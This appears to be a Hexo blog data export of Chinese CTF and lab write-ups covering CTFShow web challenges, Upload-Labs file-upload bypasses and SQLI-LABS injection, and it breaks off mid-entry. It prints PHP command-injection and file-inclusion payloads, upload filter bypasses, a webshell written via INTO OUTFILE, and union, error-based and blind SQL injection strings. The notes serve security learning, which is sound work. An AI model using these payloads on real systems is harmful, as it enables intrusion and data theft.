{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-09-25T07:31:05.000Z","updated":"2022-09-25T07:31:05.746Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-09-25T07:30:54.000Z","updated":"2022-09-25T07:30:54.491Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tages","date":"2022-09-26T13:53:53.000Z","updated":"2022-09-26T13:53:53.638Z","comments":true,"path":"tages/index.html","permalink":"http://example.com/tages/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-09-25T07:29:56.000Z","updated":"2022-09-25T07:30:40.051Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2022-09-28T18:41:56.338Z","updated":"2022-09-28T18:41:49.684Z","comments":true,"path":"message-board/index.html","permalink":"http://example.com/message-board/index.html","excerpt":"","text":""}],"posts":[{"title":"CTFShow","slug":"CTFShow","date":"2022-09-28T18:49:51.000Z","updated":"2022-09-28T19:06:29.769Z","comments":true,"path":"/post/CTFShow.html","link":"","permalink":"http://example.com/post/CTFShow.html","excerpt":"","text":"CTFShow 信息收集web1开发注释未及时删除 直接查看源码，flag在注释里 web2js前台拦截 === 无效操作 浏览器禁用js或则Burp抓包 web3f12 网络在响应头里就有flag或者直接抓包 web4robots.txt文件泄露 直接查看robots.txt robots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。 常见的备份文件 .index.php.swp index.php.swp index.php.bak .index.php~ index.php.bak_Edietplus index.php.~ index.php.1 index.php index.php~ index.php.rar index.php.zip index.php.7z index.php.tar.gz www.zip www.rar www.zip www.7z www.tar.gz www.tar web.zip web.rar web.zip web.7z web.tar.gz web.tar wwwroot.rar web.rar web5phps文件泄露 phps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取 php备份文件：后缀为php~或者index.php.bak php的源代码文件：后缀为phps web6源码压缩包泄露 直接访问www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问 web7版本控制泄露源码 git / svn 是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 访问 url/.git/ ，得到 flag 。 .git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害 类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。 web8.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制） 访问 url/.svn/ ，得到 flag 。 Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 web9vim临时文件泄露 如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如**.swo**文件。 vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn 直接访问index.php.swp 一、vim备份文件 默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看； eg:index.php普遍意义上的首页，输入域名不一定会显示。 它的备份文件则为index.php~ 二、vim临时文件 vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件 .submit.swp。如果文件正常退出，则此文件自动删除。 web10cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。 web11域名txt记录泄露 域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag https://whois.chinaz.com/ http://www.jsons.cn/nslookup/ https://zijian.aliyun.com/ web12敏感信息公布 url/admin/访问后台需要登陆 猜测用户名为admin，密码为页面最下方联系电话号码，登录成功 web13内部技术文档泄露 在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag web14编辑器配置不当 进入url/editor/ 插入文件-&gt;文件空间 随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt 直接访问url+/nothinghere/fl000g.txt进入得到flag web15密码逻辑脆弱 进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag web16探针泄露 考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag 访问/tz.php 再点击进入phpinfo可以得到flag web17备份SQL文件泄露 backup.sql web18js敏感信息泄露 直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag web19前端密钥泄露 直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag web20mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database} web21CDN穿透 确定 IP 的话，直接 ping 域名，得到 IP 爆破web21tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com) 抓包发现，随便输入的密码被base64编码，解码username:password 对密码进行爆破，猜测用户名为admin: 爆破时要进行base64加密以及关掉默认的url编码 最后密码为shark63，获取flag web22子域名爆破 使用域名挖掘机 web23substr(string,start,length) 打开就是一段代码，手动写一段脚本爆破 &lt;!DOCTYPE html&gt; &lt;html lang='en'&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php for ($i = 0; $i &lt; 1000; $i = $i + 1) { $token = md5($i); if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) { if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) { echo $i; } } } ?&gt; &lt;/body&gt; &lt;/html&gt; web24mt_srand伪随机数 mt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码 mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的 &lt;?php mt_srand(372619038); echo intval(mt_rand()); ?&gt; web25mtrand()随机数生成漏洞 include(\"flag.php\"); if(isset($_GET['r'])){ $r = $_GET['r']; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值 if((!$rand)){ if($_COOKIE['token']==(mt_rand()+mt_rand())){ echo $flag; } }else{ echo $rand; } }else{ highlight_file(__FILE__); echo system('cat /proc/version'); } 使用php_mt_seed - MT_RAND（）种子饼干 (openwall.com)爆破出种子 最后可以得到，这三个mt_rand()的值都不一样 &lt;?php mt_srand(2414568491); echo mt_rand().\"\\n\"; echo mt_rand()+mt_rand(); ?&gt; 然后通过burp发包获取flag web26抓包后直接发包得到flag web27爆破生日日期 可以获取录取名单，得到姓名和缺少出生日期的身份证号码 在查询页面发包 抓取后进行爆破 最后得到正确的日期 登录获取flag web28提示爆破目录 通过暴力破解目录/0-100/0-100/看返回数据包 爆破的时候去掉2.txt 仅仅爆破目录即可 命令执行web29preg_match 执行一个正则表达式匹配 &lt;?php //模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索 if (preg_match(\"/php/i\", \"PHP is the web scripting language of choice.\")) { echo \"查找到匹配的字符串 php。\"; } else { echo \"未发现匹配的字符串 php。\"; } ?&gt; error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 首先执行ls命令，利用system ?c=system(ls); 得到两个文件 flag.php和index.php 用cat命令读取flag.php，因为过滤了flag所以使用通配符 ?c=system('cat fla*.php'); ?c=system(\"nl fla?????\"); ?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`; ?c=echo `nl fl\\ag.php`;//转义字符绕过 ?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php ?c=eval($_GET[1]);&amp;1=system('nl flag.php'); ?c=awk '{printf $0}' flag.php|| ?c=$a=\"fla\";$b=\"g.php\";echo%20file_get_contents($a.$b); linux文件内容查看命令 cat、tac、nl、more、less、head、tail、`` 通配符 *可以通配多个字符 ?可以通配一个字符 web30过滤了flag、system、php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 可以使用其他函数 system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 同shell_exec() c=echo exec('nl fla?????'); c=echo `nl fla''g.p''hp`; c=echo `nl fla?????`; web31error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格 c=highlight_file(next(array_reverse(scandir(dirname(__FILE__))))); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种 c=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"nl%09fl[a]*\");等价于system() c=echo`strings%09f*`; c=echo`strings\\$IFS\\$9f*`必须加转义字符 show_source(next(array_reverse(scandir(pos(localeconv()))))); scandir('.')这个函数的作用是扫描当前目录 localeconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. pos()/current()函数返回数组第一个值 array_reverse()是将数组颠倒 next()将数组指针一项下一位 show_source()的意思是读取函数内容 web32if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=$nice=include$_GET[\"url\"]?&gt;&amp;url=php://filter/read=convert.base64- encode/resource=flag.php //include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替 //利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。 data伪协议 把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本 c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web33if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64- encode/resource=flag.php c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; web34if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } web35同上 web36if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; web37if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt; /?c=data://text/plain,&lt;?php system('cat fla*');?&gt; 还可以配合UA头执行日志包含 c=/var/log/nginx/access.log web38if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|php|file/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== 也可以日志包含 c=/var/log/nginx/access.log web39data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用 if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c.\".php\"); } }else{ highlight_file(__FILE__); } /?c=data://text/plain,&lt;?php system('cat fla*');?&gt; ??为什么base64不行 web40if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } web41web42web43web44web45web46web47web48web49web50web51web52web53web54web55web56web57web58web59web60","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Upload-Labs","slug":"Upload-Labs","date":"2022-09-28T18:49:40.000Z","updated":"2022-09-28T19:08:02.868Z","comments":true,"path":"/post/Upload-Labs.html","link":"","permalink":"http://example.com/post/Upload-Labs.html","excerpt":"","text":"Upload-Labs Pass-011使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。 使用Burpsuite抓包 将jpg后缀修改为php，发包 就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址 2直接查看源码，发现就是js有一个checkFile()，将浏览器关闭js 修改后就可以直接上传php文件，重复上述步骤 源码 就是对文件后缀做限制 Pass-02 服务器MIME检测：即检测Content-Type的内容。 绕过方法：修改类型为允许上传的类型即可。 直接上传php文件，文件类型不正确，使用burpsuite抓包 修改Content-Type为image/jpeg、image/png、image/gif 上传成功 源码就是对文件类型进行判断 Pass-03上传php文件 基于黑名单检测：黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门blacklist，里面包含常见的危险脚本文件。 绕过办法： 文件大小写让绕过（Php ，PhP pHp，等） 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php 基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。 基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。 用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml、 .php3 .php5、php4、 .pht、php1、php2、phps【这些后缀会被当成php文件解析】等等。 特殊文件名绕过 修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格)由于这种命名格式在 windows系统里是不允许的，所以在绕过上传之后windows系统会自动去掉.点和空格。Linux和Unix中没有这个特性。 ::$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名) . .htaccess文件攻击（结合黑名单攻击） 解析绕过 使用双写绕过，因为会过滤::$DATA 源码 Pass-04.htaccess是什么： 全称是Hypertext Access(超文本入口) .htaccess文件也被成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 .htaccess功能： 文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表 很可惜，这么一个强大的功能默认是不开启的 Apache （有伪静态的都可以试试） 用法： AddType application/x-httpd-php .jpg 这个指令代表着.jpg文件会当做php来解析 SetHandler application/x-httpd-php，意思是把所有文件都解析为php文件来执行。 Pass-05Pass-06 Pass-07 Pass-08 Pass-09 Pass-10 Pass-11 Pass-12 Pass-13 Pass-14 Pass-15 Pass-16 Pass-17 Pass-18 Pass-20 Pass-21","categories":[],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"SQLI-LABS","slug":"SQLI-LABS","date":"2022-09-28T18:49:24.000Z","updated":"2022-09-28T19:07:02.814Z","comments":true,"path":"/post/SQLI-LABS.html","link":"","permalink":"http://example.com/post/SQLI-LABS.html","excerpt":"","text":"Less-1判断是否存在注入: ?id=1' and 1=1 --+ 判断字段数: ?id=1' order by 3--+ 判断显错位: ?id=-1' union select 1,2,3--+ 判断库名: ?id=-1' union select 1,database(),3--+ 判断表名: ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+ ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1--+ ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ //可能会因为显示位不全，显示错误 判断列名: ?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'--+ ?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users'--+ 判断数据: ?id=-1' union select 1,id,3 from emails--+ Less-2类第一关 Less-3(‘1’) 判断是否存在注入: ?id=1') and 1=1 --+ 下面类第一关 Less-4$id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; 判断是否存在注入: ?id=1\") and 1=1 --+ 下面类第一关 Less-5盲注&amp;报错注入 $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } else { echo \"Please input the ID as parameter with numeric value\";} 判断是否存在注入: ?id=1' and 1=1 --+ 判断字段数: ?id=1' order by 3--+ 判断显错位: 盲注没有显错位 判断库名: ?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x72),1)--+ 判断表名: ?id=1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+ 判断列名: ?id=1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+ 判断数据: ?id=1' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+ updatexml() 更新xml文档的函数 语法：updatexml(目标xml内容，xml文档路径，更新的内容) updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了 但是报错的时候他其实已经执行了那个子查询代码！ [0x7e实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错]~ ~ 添加一个不符合规则的符号进行报错，从而爆出子查询的内容：SELECT database() updatexml ()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数 eg: select *from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) 但是要注意，and情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or 某些没有回显盲注也可以用这个updatexml()做出来。 但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。 SELECT * FROM users union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1); 1105 - XPATH syntax error: '~security~' Less-6判断是否存在注入: ?id=1\" and 1=1 --+ 其他类题5 Less-7outfile 向服务器写入文件 在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个： 写 into dumpfile()//保留格式 into outfile()//原始数据 读 load_file() union select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/1.php' 这些都是需要设置secure_file_priv=，如果他为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null时则禁止导入导出功能 判断字段数: ?id=1')) order by 3 --+ 写马: ?id=1')) union select 1,\"&lt;?php eval($_REQUEST[1])?&gt;\",3 into outfile \"D:/AppData/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php\" --+ 访问一句话木马 http://127.0.0.1:8090/Less-7/shell.php?1=phpinfo(); Less-8盲注 布尔型盲注: length()函数 返回字符串长度 substr() 截取字符串 (语法：SUBSTR(str,pos,len);) ascii() 返回字符的ascii码 [将字符变为数字wei] 时间型盲注: sleep()将程序挂起一段时间 n为n秒 if(expr1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句 拆解库名长度 ?id=1' and (length(database()))=8 --+ 利用ASCII码猜解当前数据库名称： ?id=1' and (ascii(substr(database(),1,1)))=115 --+ 返回正常，说明数据库名称第一位是s ?id=1' and (ascii(substr(database(),2,1)))=101 --+ 返回正常，说明数据库名称第二位是e 猜表名: ?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+ 如果返回正常，说明数据库表名的第一个的第一位是e 猜字段名: ?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105 --+ 如果返回正常，说明emails表中的列名称第一位是i Less-9同样按照盲注的手法，尝试后发现这里无论输入什么条件，回显的结果都是一个，这就证明不能再用刚刚布尔盲注的做法了，要尝试使用时间盲注 布尔盲注页面会有两种状态 时间盲注无论条件是什么都只返回一种页面 猜解库名长度: ?id=1' and if(length(database())=8,sleep(5),1) --+ 利用ASCII码猜解当前数据库名称: ?id=1' and if((ascii(substr(database(),1,1))=115),sleep(5),1) --+ 延时，说明数据库名称第一位是s 猜表名: ?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1) --+ 延时，说明数据库表名的第一个的第一位是e 猜字段名: ?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1) --+ 如果返回正常，说明emails表中的列名称第一位是i Less-10闭合方式有区别 ?id=1\" and if(length(database())=8,sleep(5),1) --+ 其他类题九 Less-11POST传参 $uname=$_POST['uname']; $passwd=$_POST['passwd']; @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; 万能密码: ' or 1=1 -- + //要有空格 ' or 1=1# 判断字段数: ' or 1=1 order by 2 -- + 判断显错位: ' union select 1,2# 判断库名: ' union select 1,database()# 判断表名: ?id=10' union select 1,table_name from information_schema.tables where table_schema='security'# 判断列名: ?id=10' union select 1,column_name from information_schema.columns where table_schema='security' and table_name ='users' limit 1,1# 判断数据: ?id=10' union select 1,username from users# Less-12闭合有区别，尝试万能密码 \") or 1=1# 其他类题十一 Less-13post传参的报错注入 判断是否存在注入: ?id=1' and 1=1 -- qwe 判断库名: ')and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe 判断表名： ')and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe 判断列名： ')and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe 判断数据： ')and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe 类题五 Less-14类题13 判断库名： \"and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe Less-15POST盲注 if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\"\\n\"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in\\n\\n \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; //print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } 猜解库名长度: ' or (length(database()))=8 # 利用ASCII码猜解当前数据库名称: ' or (ascii(substr(database(),1,1)))=115# 返回正常，说明数据库名称第一位是s ' or (ascii(substr(database(),2,1)))=101# 返回正常，说明数据库名称第二位是e 猜表名: ' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101# 如果返回正常，说明数据库表名的第一个的第一位是e 猜字段名: 'or (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105# 如果返回正常，说明emails表中的列名称第一位是i Less-16$uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; 类题15 闭合区别 \") or (length(database()))=8 # Less-17密码重置，所以从下面的password入手，使用报错注入 判断是否存在注入: ' or 1=1 -- + 判断库名: ' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+ 判断表名: ' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+ 判断列名: ' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+ 判断数据: ' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+ Less-18进入网站就显示了ip，网页记录了ip、浏览器信息以及其他信息就可能是头注入 请求头 User-Agent 浏览器的身份标识字符串 Referer 表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏 览器带到了当前页面。 Accept 可接受的响应内容类型（Content-Types）。 X-Forwarded-For 可以用来表示HTTP请求端真实IP Date 发送该消息的日期和时间（以RFC 7231中定义的\"HTTP日期\"格式来发 送） $insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; 注入点为uagent即User-Agent 必须要登录成功才会记录IP，弱口令 uname=admin&amp;passwd=admin 判断库名: 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- # $insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #', '$IP', $uname)\"; 后面的1,1)为了补齐后面'$IP', $uname两个字段 判断表名: 'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1),1,1)-- # 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1),1,1)-- qwe 判断数据: 'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1),1,1)-- qwe Less-19注入点与18不同，其他类18 注入点变为referer $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; Less-20登录之后会显示很多个人信息，特别是提示cookie 诸如点是cookie $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\"; 判断库名: 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe 判断表名: 'and updatexml(1,concat(0x7e,(select table_name from 